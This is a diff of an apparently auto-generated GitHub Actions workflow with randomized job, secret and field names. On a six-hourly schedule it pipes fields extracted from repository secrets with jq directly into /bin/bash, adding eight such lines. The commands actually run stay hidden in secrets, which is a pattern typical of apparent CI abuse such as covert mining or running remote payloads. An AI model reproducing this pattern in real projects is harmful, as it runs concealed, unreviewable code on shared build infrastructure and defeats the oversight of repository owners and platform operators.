@@ -2,19 +2,22 @@ name: mufuya3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
-
-jobs:  # 27640
+    - cron: '3 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mufuya3456
         env:
-          aehpd83516: ${{ secrets.aehpd83516 }}
+          qc4607: ${{ secrets.qc4607 }}
         run: |
-          echo $aehpd83516 | jq -r .h89819 | /bin/bash
-          echo $vuotg5217 | jq -r .ejedj6 | /bin/bash
-          echo $bwqt096 | jq -r .ct1253 | /bin/bash
+          echo $qc4607 | jq -r .l309 | /bin/bash
+          echo $tmiw97 | jq -r .dov33208 | /bin/bash
+          echo $hjehr99886 | jq -r .fti86 | /bin/bash
+          echo $cje04 | jq -r .jcb78069 | /bin/bash
+          echo $m9 | jq -r .jdf621 | /bin/bash
+          echo $qgcq3 | jq -r .petuv98149 | /bin/bash
+          echo $kzneb56206 | jq -r .ifo7084 | /bin/bash
+          echo $jfaa609 | jq -r .but8 | /bin/bash
 
